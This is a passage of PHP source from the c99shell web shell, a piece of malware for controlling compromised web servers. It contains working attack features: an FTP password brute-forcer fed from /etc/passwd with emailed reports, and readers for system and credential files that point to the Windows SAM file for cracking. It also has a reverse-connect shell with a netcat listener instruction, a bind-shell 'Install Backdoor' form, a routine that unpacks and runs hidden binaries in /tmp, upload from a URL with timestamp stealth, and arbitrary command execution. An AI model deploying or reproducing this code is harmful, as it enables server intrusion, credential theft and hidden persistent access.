(!mkdir($mkdir)) {echo "<b>Make Dir \\"".htmlspecialchars($mkdir)."\\"</b>: access denied";}\r\n  echo "<br><br>";\r\n }\r\n $act = $dspact = "ls";\r\n}\r\nif ($act == "ftpquickbrute")\r\n{\r\n echo "<b>FTP Brute Forcer: </b><br>";\r\n if (!win) {echo "This functions not work in Windows!<br><br>";}\r\n else\r\n {\r\n  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)\r\n  {\r\n   if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array("/bin/FALSE","/sbin/nologin")));}\r\n   else {$TRUE = TRUE;}\r\n   if ($TRUE)\r\n   {\r\n    $sock = @ftp_connect($host,$port,$timeout);\r\n    if (@ftp_login($sock,$login,$pass))\r\n    {\r\n     echo "<a href=\\"ftp://".$login.":".$pass."@".$host."\\" target=\\"_blank\\"><b>Connected to ".$host." with login \\"".$login."\\" and password \\"".$pass."\\"</b></a>.<br>";\r\n     ob_flush();\r\n     return TRUE;\r\n    }\r\n   }\r\n  }\r\n  if (!empty($submit))\r\n  {\r\n   if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}\r\n   $fp = fopen("/etc/passwd","r");\r\n   if (!$fp) {echo "Can\'t get /etc/passwd for password-list.";}\r\n   else\r\n   {\r\n    if ($fqb_logging)\r\n    {\r\n     if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");}\r\n     else {$fqb_logfp = FALSE;}\r\n     $fqb_log = "FTP Quick Brute (called c99shell v. ".$shver.") started at ".date("d.m.Y H:i:s")."\\r\\n\\r\\n";\r\n     if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}\r\n    }\r\n    ob_flush();\r\n    $i = $success = 0;\r\n    $ftpquick_st = getmicrotime();\r\n    while(!feof($fp))\r\n    {\r\n     $str = explode(":",fgets($fp,2048));\r\n     if (c99ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))\r\n     {\r\n      echo "<b>Connected to ".getenv("SERVER_NAME")." with login \\"".$str[0]."\\" and password \\"".$str[0]."\\"</b><br>";\r\n      $fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \\"".$str[0]."\\" and password \\"".$str[0]."\\", at ".date("d.m.Y H:i:s")."\\r\\n";\r\n      if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}\r\n      $success++;\r\n      ob_flush();\r\n     }\r\n     if ($i > $fqb_lenght) {break;}\r\n     $i++;\r\n    }\r\n    if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!\\r\\n";}\r\n    $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);\r\n    echo "<hr size=\\"1\\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font color=green><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>";\r\n    $fqb_log .= "\\r\\n------------------------------------------\\r\\nDone!\\r\\nTotal time (secs.): ".$ftpquick_t."\\r\\nTotal connections: ".$i."\\r\\nSuccess.: ".$success."\\r\\nUnsuccess.:".($i-$success)."\\r\\nConnects per second: ".round($i/$ftpquick_t,2)."\\r\\n";\r\n    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}\r\n    if ($fqb_logemail) {@mail($fqb_logemail,"c99shell v. ".$shver." report",$fqb_log);}\r\n    fclose($fqb_logfp);\r\n   }\r\n  }\r\n  else\r\n  {\r\n   $logfile = $tmpdir_logs."ftpquickbrute_".date("d.m.Y_H_i_s").".log";\r\n   $logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);\r\n   echo "<form action=\\"".$surl."\\"><input type=hidden name=act value=\\"ftpquickbrute\\"><br>Read first: <input type=text name=\\"fqb_lenght\\" value=\\"".$nixpwdperpage."\\"><br><br>Users only with shell?&nbsp;<input type=\\"checkbox\\" name=\\"fqb_onlywithsh\\" value=\\"1\\"><br><br>Logging?&nbsp;<input type=\\"checkbox\\" name=\\"fqb_logging\\" value=\\"1\\" checked><br><br>Logging to file?&nbsp;<input type=\\"text\\" name=\\"fqb_logfile\\" value=\\"".$logfile."\\" size=\\"".(strlen($logfile)+2*(strlen($logfile)/10))."\\"><br>Logging to e-mail?&nbsp;<input type=\\"text\\" name=\\"fqb_logemail\\" value=\\"".$log_email."\\" size=\\"".(strlen($logemail)+2*(strlen($logemail)/10))."\\"><br><br><input type=submit name=submit value=\\"Brute\\"></form>";\r\n  }\r\n }\r\n}\r\nif ($act == "d")\r\n{\r\n if (!is_dir($d)) {echo "<center><b>Permision denied!</b></center>";}\r\n else\r\n {\r\n  echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";\r\n  if (!$win)\r\n  {\r\n   echo "<tr><td><b>Owner/Group</b></td><td> ";\r\n   $ow = posix_getpwuid(fileowner($d));\r\n   $gr = posix_getgrgid(filegroup($d));\r\n   $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));\r\n  }\r\n  echo "<tr><td><b>Perms</b></td><td><a href=\\"".$surl."act=chmod&d=".urlencode($d)."\\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>";\r\n }\r\n}\r\nif ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();}\r\nif ($act == "security")\r\n{\r\n echo "<center><b>Server Information:</b></center><b>Open base dir: ".$hopenbasedir."</b><br>";\r\n if (!$win)\r\n {\r\n  if ($nixpasswd)\r\n  {\r\n   if ($nixpasswd == 1) {$nixpasswd = 0;}\r\n   echo "<b>*nix /etc/passwd:</b><br>";\r\n   if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}\r\n   if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}\r\n   echo "<form action=\\"".$surl."\\"><input type=hidden name=act value=\\"security\\"><input type=hidden name=\\"nixpasswd\\" value=\\"1\\"><b>From:</b>&nbsp;<input type=\\"text=\\" name=\\"nixpwd_s\\" value=\\"".$nixpwd_s."\\">&nbsp;<b>To:</b>&nbsp;<input type=\\"text\\" name=\\"nixpwd_e\\" value=\\"".$nixpwd_e."\\">&nbsp;<input type=submit value=\\"View\\"></form><br>";\r\n   $i = $nixpwd_s;\r\n   while ($i < $nixpwd_e)\r\n   {\r\n    $uid = posix_getpwuid($i);\r\n    if ($uid)\r\n    {\r\n     $uid["dir"] = "<a href=\\"".$surl."act=ls&d=".urlencode($uid["dir"])."\\">".$uid["dir"]."</a>";\r\n     echo join(":",$uid)."<br>";\r\n    }\r\n    $i++;\r\n   }\r\n  }\r\n  else {echo "<br><a href=\\"".$surl."act=security&nixpasswd=1&d=".$ud."\\"><b><u>Get /etc/passwd</u></b></a><br>";}\r\n }\r\n else\r\n {\r\n  $v = $_SERVER["WINDIR"]."\\repair\\sam";\r\n  if (file_get_contents($v)) {echo "<b><font color=red>You can\'t crack winnt passwords(".$v.") </font></b><br>";}\r\n  else {echo "</br><b><font color=green>You can crack winnt passwords. <a href=\\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\\\repair&ft=download\\"><u><b>Download</b></u></a>, and use lcp.crack+ \xa9.</font></b><br>";}\r\n }\r\n if (file_get_contents("/etc/userdomains")) {echo "<b><font color=green><a href=\\"".$surl."act=f&f=userdomains&d=".urlencode("/etc")."&ft=txt\\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";}\r\n if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=green><a href=\\"".$surl."act=f&f=accounting.log&d=".urlencode("/var/cpanel/")."\\"&ft=txt><u><b>View cpanel logs</b></u></a></font></b><br>";}\r\n if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=green><a href=\\"".$surl."act=f&f=httpd.conf&d=".urlencode("/usr/local/apache/conf")."&ft=txt\\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}\r\n if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=green><a href=\\"".$surl."act=f&f=httpd.conf&d=".urlencode("/etc")."&ft=txt\\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}\r\n if (file_get_contents("/etc/syslog.conf")) {echo "<b><font color=green><a href=\\"".$surl."act=f&f=syslog.conf&d=".urlencode("/etc")."&ft=txt\\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>";}\r\n if (file_get_contents("/etc/motd")) {echo "<b><font color=green><a href=\\"".$surl."act=f&f=motd&d=".urlencode("/etc")."&ft=txt\\"><u><b>Message Of The Day</b></u></a></font></b><br>";}\r\n if (file_get_contents("/etc/hosts")) {echo "<b><font color=green><a href=\\"".$surl."act=f&f=hosts&d=".urlencode("/etc")."&ft=txt\\"><u><b>Hosts</b></u></a></font></b><br>";}\r\n function displaysecinfo($name,$value) {if (!empty($value)) {if (!empty($name)) {$name = "<b>".$name." - </b>";} echo $name.nl2br($value)."<br>";}}\r\n displaysecinfo("OS Version?",myshellexec("cat /proc/version"));\r\n displaysecinfo("Kernel version?",myshellexec("sysctl -a | grep version"));\r\n displaysecinfo("Distrib name",myshellexec("cat /etc/issue.net"));\r\n displaysecinfo("Distrib name (2)",myshellexec("cat /etc/*-realise"));\r\n displaysecinfo("CPU?",myshellexec("cat /proc/cpuinfo"));\r\n displaysecinfo("RAM",myshellexec("free -m"));\r\n displaysecinfo("HDD space",myshellexec("df -h"));\r\n displaysecinfo("List of Attributes",myshellexec("lsattr -a"));\r\n displaysecinfo("Mount options ",myshellexec("cat /etc/fstab"));\r\n displaysecinfo("Is cURL installed?",myshellexec("which curl"));\r\n displaysecinfo("Is lynx installed?",myshellexec("which lynx"));\r\n displaysecinfo("Is links installed?",myshellexec("which links"));\r\n displaysecinfo("Is fetch installed?",myshellexec("which fetch"));\r\n displaysecinfo("Is GET installed?",myshellexec("which GET"));\r\n displaysecinfo("Is perl installed?",myshellexec("which perl"));\r\n displaysecinfo("Where is apache",myshellexec("whereis apache"));\r\n displaysecinfo("Where is perl?",myshellexec("whereis perl"));\r\n displaysecinfo("locate proftpd.conf",myshellexec("locate proftpd.conf"));\r\n displaysecinfo("locate httpd.conf",myshellexec("locate httpd.conf"));\r\n displaysecinfo("locate my.conf",myshellexec("locate my.conf"));\r\n displaysecinfo("locate psybnc.conf",myshellexec("locate psybnc.conf"));\r\n}\r\nif ($act == "mkfile")\r\n{\r\n if ($mkfile != $d)\r\n {\r\n  if (file_exists($mkfile)) {echo "<b>Make File \\"".htmlspecialchars($mkfile)."\\"</b>: object alredy exists";}\r\n  elseif (!fopen($mkfile,"w")) {echo "<b>Make File \\"".htmlspecialchars($mkfile)."\\"</b>: access denied";}\r\n  else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}\r\n }\r\n else {$act = $dspact = "ls";}\r\n}\r\nif ($act == "encoder")\r\n{\r\n echo "<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><b>Encoder:</b></br></br><form name=\\"encoder\\" action=\\"".$surl."\\" method=POST><input type=hidden name=act value=encoder><b>Input:</b><br><textarea name=\\"encoder_input\\" id=\\"input\\" cols=50 rows=5>".@htmlspecialchars($encoder_input)."</textarea><br><br><input type=submit value=\\"calculate\\"><br><br><b>Hashes</b>:</br></br>";\r\n foreach(array("md5","crypt","sha1","crc32") as $v)\r\n {\r\n  echo $v." - <input type=text size=50 onFocus=\\"this.select()\\" onMouseover=\\"this.select()\\" onMouseout=\\"this.select()\\" value=\\"".$v($encoder_input)."\\" readonly><br>";\r\n }\r\n echo "</br><b>Url:</b><br>urlencode - <input type=text size=35 onFocus=\\"this.select()\\" onMouseover=\\"this.select()\\" onMouseout=\\"this.select()\\" value=\\"".urlencode($encoder_input)."\\" readonly>\r\n <br>urldecode - <input type=text size=35 onFocus=\\"this.select()\\" onMouseover=\\"this.select()\\" onMouseout=\\"this.select()\\" value=\\"".htmlspecialchars(urldecode($encoder_input))."\\" readonly>\r\n </br></br><b>Base64:</b></br> base64_encode - <input type=text size=35 onFocus=\\"this.select()\\" onMouseover=\\"this.select()\\" onMouseout=\\"this.select()\\" value=\\"".base64_encode($encoder_input)."\\" readonly>";\r\n echo "</br>base64_decode - ";\r\n if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "<input type=text size=35 value=\\"failed\\" disabled readonly>";}\r\n else\r\n {\r\n  $debase64 = base64_decode($encoder_input);\r\n  $debase64 = str_replace("\\0","[0]",$debase64);\r\n  $a = explode("\\r\\n",$debase64);\r\n  $rows = count($a);\r\n  $debase64 = htmlspecialchars($debase64);\r\n  if ($rows == 1) {echo "<input type=text size=35 onFocus=\\"this.select()\\" onMouseover=\\"this.select()\\" onMouseout=\\"this.select()\\" value=\\"".$debase64."\\" id=\\"debase64\\" readonly>";}\r\n  else {$rows++; echo "<textarea cols=\\"40\\" rows=\\"".$rows."\\" onFocus=\\"this.select()\\" onMouseover=\\"this.select()\\" onMouseout=\\"this.select()\\" id=\\"debase64\\" readonly>".$debase64."</textarea>";}\r\n  echo "&nbsp;<a href=\\"#\\" onclick=\\"set_encoder_input(document.forms.encoder.debase64.value)\\"><b></b></a>";\r\n }\r\n echo "</br></br><b>Base convertations</b>:</br></br>dec2hex - <input type=text size=35 onFocus=\\"this.select()\\" onMouseover=\\"this.select()\\" onMouseout=\\"this.select()\\" value=\\"";\r\n $c = strlen($encoder_input);\r\n for($i=0;$i<$c;$i++)\r\n {\r\n  $hex = dechex(ord($encoder_input[$i]));\r\n  if ($encoder_input[$i] == "&") {echo $encoder_input[$i];}\r\n  elseif ($encoder_input[$i] != "\\\\") {echo "%".$hex;}\r\n }\r\n echo "\\" readonly><br></form>";\r\n}\r\nif ($act == "backc")\r\n{\r\n $ip = $_SERVER["REMOTE_ADDR"];\r\n $msg = $_POST[\'backcconnmsg\'];\r\n $emsg = $_POST[\'backcconnmsge\'];\r\n echo("<b>Back-Connection:</b></br></br><form name=form method=POST>Host:<input type=text name=backconnectip size=15 value=$ip> Port: <input type=text name=backconnectport size=15 value=5992> Use: <select size=1 name=use><option value=Perl>Perl</option><option value=C>C</option></select> <input type=submit name=submit value=Connect></form>Click \'Connect\' only after you open port for it first. Once open, use NetCat, and run \'<b>nc -l -n -v -p 5992</b>\'<br><br>");\r\n echo("$msg");\r\n echo("$emsg");\r\n}\r\n\r\nif ($act == "shbd"){\r\n$msg = $_POST[\'backcconnmsg\'];\r\n$emsg = $_POST[\'backcconnmsge\'];\r\necho("<b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>\r\nBind Port: <input type=\'text\' name=\'backconnectport\' value=\'5992\'>\r\n<input type=\'hidden\' name=\'use\' value=\'shbd\'>\r\n<input type=\'submit\' value=\'Install Backdoor\'></form>");\r\necho("$msg");\r\necho("$emsg");\r\n}\r\n\r\n\r\nif ($act == "proxy") {\r\n cf("/tmp/hantu.tgz",$proxy_shit);\r\n ex("cd /tmp;tar -zxvf hantu.tgz");\r\n ex("cd /tmp;cd .setan;chmod 777 xh");\r\n ex("cd /tmp;cd .setan;chmod 777 httpd");\r\n ex("cd /tmp;cd .setan;./xh -s [kmod] ./httpd start");\r\n checkproxyhost();\r\n $msg = $_POST[\'proxyhostmsg\'];\r\n echo("$msg");\r\n unlink("/tmp/hantu.tgz");\r\n ex("cd /tmp; rm -r .setan"); \r\n}\r\n\r\nif ($act == "selfremove")\r\n{\r\n if (($submit == $rndcode) and ($submit != ""))\r\n {\r\n  if (unlink(__FILE__)) {@ob_clean(); echo "Gone!"; c99shexit(); }\r\n  else {echo "<center><b>Can\'t delete ".__FILE__."!</b></center>";}\r\n }\r\n else\r\n {\r\n  if (!empty($rndcode)) {echo "<b>Error: incorrect confimation!</b>";}\r\n  $rnd = rand(0,9).rand(0,9).rand(0,9);\r\n  echo "<form action=\\"".$surl."\\"><input type=hidden name=act value=selfremove><b>Self-remove: ".__FILE__." </br></br>For confirmation, enter \\"".$rnd."\\"</b>:&nbsp;<input type=hidden name=rndcode value=\\"".$rnd."\\"><input type=text name=submit>&nbsp;<input type=submit value=\\"YES\\"></form>";\r\n }\r\n}\r\nif ($act == "search"){\r\n echo "<b>Search file-system:</b></br></br>";\r\n if (empty($search_in)) {$search_in = $d;}\r\n if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}\r\n if (empty($search_text_wwo)) {$search_text_regexp = 0;}\r\n if (!empty($submit))\r\n {\r\n  $found = array();\r\n  $found_d = 0;\r\n  $found_f = 0;\r\n  $search_i_f = 0;\r\n  $search_i_d = 0;\r\n  $a = array\r\n  (\r\n   "name"=>$search_name, "name_regexp"=>$search_name_regexp,\r\n   "text"=>$search_text, "text_regexp"=>$search_text_regxp,\r\n   "text_wwo"=>$search_text_wwo,\r\n   "text_cs"=>$search_text_cs,\r\n   "text_not"=>$search_text_not\r\n  );\r\n  $searchtime = getmicrotime();\r\n  $in = array_unique(explode(";",$search_in));\r\n  foreach($in as $v) {c99fsearch($v);}\r\n  $searchtime = round(getmicrotime()-$searchtime,4);\r\n  if (count($found) == 0) {echo "<b>No files found!</b>";}\r\n  else\r\n  {\r\n   $ls_arr = $found;\r\n   $disp_fullpath = TRUE;\r\n   $act = "ls";\r\n  }\r\n }\r\n echo "<form method=POST>\r\n<input type=hidden name=\\"d\\" value=\\"".$dispd."\\"><input type=hidden name=act value=\\"".$dspact."\\">\r\n<b>File/folder name: </b><input type=\\"text\\" name=\\"search_name\\" size=\\"".round(strlen($search_name)+25)."\\" value=\\"".htmlspecialchars($search_name)."\\">&nbsp;<input type=\\"checkbox\\" name=\\"search_name_regexp\\" value=\\"1\\" ".($search_name_regexp == 1?" checked":"")."> - regexp\r\n<br><b>Directory:&nbsp;&nbsp; </b><input type=\\"text\\" name=\\"search_in\\" size=\\"".round(strlen($search_in)+25)."\\" value=\\"".htmlspecialchars($search_in)."\\">\r\n<br><b>Text:</b>&nbsp;&nbsp;<input type=text name=\\"search_text\\" size=42 value=".htmlspecialchars($search_text).">\r\n\r\n<br><br><input type=\\"checkbox\\" name=\\"search_text_regexp\\" value=\\"1\\" ".($search_text_regexp == 1?" checked":"")."> - regexp\r\n&nbsp;&nbsp;<input type=\\"checkbox\\" name=\\"search_text_wwo\\" value=\\"1\\" ".($search_text_wwo == 1?" checked":"")."> - <u>w</u>hole words only\r\n&nbsp;&nbsp;<input type=\\"checkbox\\" name=\\"search_text_cs\\" value=\\"1\\" ".($search_text_cs == 1?" checked":"")."> - cas<u>e</u> sensitive\r\n&nbsp;&nbsp;<input type=\\"checkbox\\" name=\\"search_text_not\\" value=\\"1\\" ".($search_text_not == 1?" checked":"")."> - find files <u>NOT</u> containing the text\r\n<br><br><input type=submit name=submit value=\\"Search\\"></form>";\r\n if ($act == "ls") {$dspact = $act; echo "<hr size=\\"1\\" noshade><b>Search took ".$searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).</b><br><br>";}\r\n}\r\nif ($act == "chmod")\r\n{\r\n $mode = fileperms($d.$f);\r\n if (!$mode) {echo "<b>Change file-mode with error:</b> can\'t get current value.";}\r\n else\r\n {\r\n  $form = TRUE;\r\n  if ($chmod_submit)\r\n  {\r\n   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);\r\n   if (chmod($d.$f,$octet)) {$act = "ls"; $form = FALSE; $err = "";}\r\n   else {$err = "Can\'t chmod to ".$octet.".";}\r\n  }\r\n  if ($form)\r\n  {\r\n   $perms = parse_perms($mode);\r\n   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\\"".$surl."\\" method=POST><input type=hidden name=d value=\\"".htmlspecialchars($d)."\\"><input type=hidden name=f value=\\"".htmlspecialchars($f)."\\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\\"Save\\"></td></tr></table></form>";\r\n  }\r\n }\r\n}\r\nif ($act == "upload")\r\n{\r\n $uploadmess = "";\r\n $uploadpath = str_replace("\\\\",DIRECTORY_SEPARATOR,$uploadpath);\r\n if (empty($uploadpath)) {$uploadpath = $d;}\r\n elseif (substr($uploadpath,-1) != "/") {$uploadpath .= "/";}\r\n if (!empty($submit))\r\n {\r\n  global $HTTP_POST_FILES;\r\n  $uploadfile = $HTTP_POST_FILES["uploadfile"];\r\n  if (!empty($uploadfile["tmp_name"]))\r\n  {\r\n   if (empty($uploadfilename)) {$destin = $uploadfile["name"];}\r\n   else {$destin = $userfilename;}\r\n   if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile["name"].". Can\'t copy \\"".$uploadfile["tmp_name"]."\\" to \\"".$uploadpath.$destin."\\".</br></br>";}\r\n  }\r\n  elseif (!empty($uploadurl))\r\n  {\r\n   if (!empty($uploadfilename)) {$destin = $uploadfilename;}\r\n   else\r\n   {\r\n    $destin = explode("/",$destin);\r\n    $destin = $destin[count($destin)-1];\r\n    if (empty($destin))\r\n    {\r\n     $i = 0;\r\n     $b = "";\r\n     while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}\r\n   }\r\n   if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorect url!</b><br>";}\r\n   else\r\n   {\r\n    $st = getmicrotime();\r\n    $content = @file_get_contents($uploadurl);\r\n    $dt = round(getmicrotime()-$st,4);\r\n    if (!$content) {$uploadmess .=  "Can\'t download file!<br>";}\r\n    else\r\n    {\r\n     if ($filestealth) {$stat = stat($uploadpath.$destin);}\r\n     $fp = fopen($uploadpath.$destin,"w");\r\n     if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!<br>";}\r\n     else\r\n     {\r\n      fwrite($fp,$content,strlen($content));\r\n      fclose($fp);\r\n      if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);}\r\n     }\r\n    }\r\n   }\r\n  }\r\n }\r\n if ($miniform)\r\n {\r\n  echo "<b>".$uploadmess."</b>";\r\n  $act = "ls";\r\n }\r\n else\r\n {\r\n  echo "<b>File upload:</b><br><b>".$uploadmess."</b><form enctype=\\"multipart/form-data\\" action=\\"".$surl."act=upload&d=".urlencode($d)."\\" method=POST>\r\nSelect file on your local computer: <input name=\\"uploadfile\\" type=\\"file\\"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or<br>\r\nInput URL: <input name=\\"uploadurl\\" type=\\"text\\" value=\\"".htmlspecialchars($uploadurl)."\\" size=\\"70\\"><br><br>\r\nSave this file dir: <input name=\\"uploadpath\\" size=\\"70\\" value=\\"".$dispd."\\"><br><br>\r\nFile-name (auto-fill): <input name=uploadfilename size=25><br><br>\r\n<input type=checkbox name=uploadautoname value=1 id=df4>&nbsp;convert file name to lovercase<br><br>\r\n<input type=submit name=submit value=\\"Upload\\">\r\n</form>";\r\n }\r\n}\r\nif ($act == "delete")\r\n{\r\n $delerr = "";\r\n foreach ($actbox as $v)\r\n {\r\n  $result = FALSE;\r\n  $result = fs_rmobj($v);\r\n  if (!$result) {$delerr .= "Can\'t delete ".htmlspecialchars($v)."<br>";}\r\n }\r\n if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}\r\n $act = "ls";\r\n}\r\nif (!$usefsbuff)\r\n{\r\n if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \\"\\$useFSbuff\\" as TRUE.</center>";}\r\n}\r\nelse\r\n{\r\n if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls"; }\r\n elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}\r\n elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";}\r\n if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}\r\n elseif ($actpastebuff)\r\n {\r\n  $psterr = "";\r\n  foreach($sess_data["copy"] as $k=>$v)\r\n  {\r\n   $to = $d.basename($v);\r\n   if (!fs_copy_obj($v,$to)) {$psterr .= "Can\'t copy ".$v." to ".$to."!<br>";}\r\n   if ($copy_unset) {unset($sess_data["copy"][$k]);}\r\n  }\r\n  foreach($sess_data["cut"] as $k=>$v)\r\n  {\r\n   $to = $d.basename($v);\r\n   if (!fs_move_obj($v,$to)) {$psterr .= "Can\'t move ".$v." to ".$to."!<br>";}\r\n   unset($sess_data["cut"][$k]);\r\n  }\r\n  c99_sess_put($sess_data);\r\n  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}\r\n  $act = "ls";\r\n }\r\n elseif ($actarcbuff)\r\n {\r\n  $arcerr = "";\r\n  if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}\r\n  else {$ext = ".tar.gz";}\r\n  if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}\r\n  $cmdline .= " ".$actarcbuff_path;\r\n  $objects = array_merge($sess_data["copy"],$sess_data["cut"]);\r\n  foreach($objects as $v)\r\n  {\r\n   $v = str_replace("\\\\",DIRECTORY_SEPARATOR,$v);\r\n   if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}\r\n   if (is_dir($v))\r\n   {\r\n    if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}\r\n    $v .= "*";\r\n   }\r\n   $cmdline .= " ".$v;\r\n  }\r\n  $tmp = realpath(".");\r\n  chdir($d);\r\n  $ret = myshellexec($cmdline);\r\n  chdir($tmp);\r\n  if (empty($ret)) {$arcerr .= "Can\'t call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}\r\n  $ret = str_replace("\\r\\n","\\n",$ret);\r\n  $ret = explode("\\n",$ret);\r\n  if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}\r\n  foreach($sess_data["cut"] as $k=>$v)\r\n  {\r\n   if (in_array($v,$ret)) {fs_rmobj($v);}\r\n   unset($sess_data["cut"][$k]);\r\n  }\r\n  c99_sess_put($sess_data);\r\n  if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}\r\n  $act = "ls";\r\n }\r\n elseif ($actpastebuff)\r\n {\r\n  $psterr = "";\r\n  foreach($sess_data["copy"] as $k=>$v)\r\n  {\r\n   $to = $d.basename($v);\r\n   if (!fs_copy_obj($v,$d)) {$psterr .= "Can\'t copy ".$v." to ".$to."!<br>";}\r\n   if ($copy_unset) {unset($sess_data["copy"][$k]);}\r\n  }\r\n  foreach($sess_data["cut"] as $k=>$v)\r\n  {\r\n   $to = $d.basename($v);\r\n   if (!fs_move_obj($v,$d)) {$psterr .= "Can\'t move ".$v." to ".$to."!<br>";}\r\n   unset($sess_data["cut"][$k]);\r\n  }\r\n  c99_sess_put($sess_data);\r\n  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}\r\n  $act = "ls";\r\n }\r\n}\r\nif ($act == "cmd")\r\n{\r\nif (trim($cmd) == "ps aux") {$act = "processes";}\r\nelseif (trim($cmd) == "tasklist") {$act = "processes";}\r\nelse\r\n{\r\n @chdir($chdir);\r\n if (!empty($submit))\r\n {\r\n  $execcmd = $_REQUEST[\'cmd\'];\r\n  echo "Result Of Locally Executed 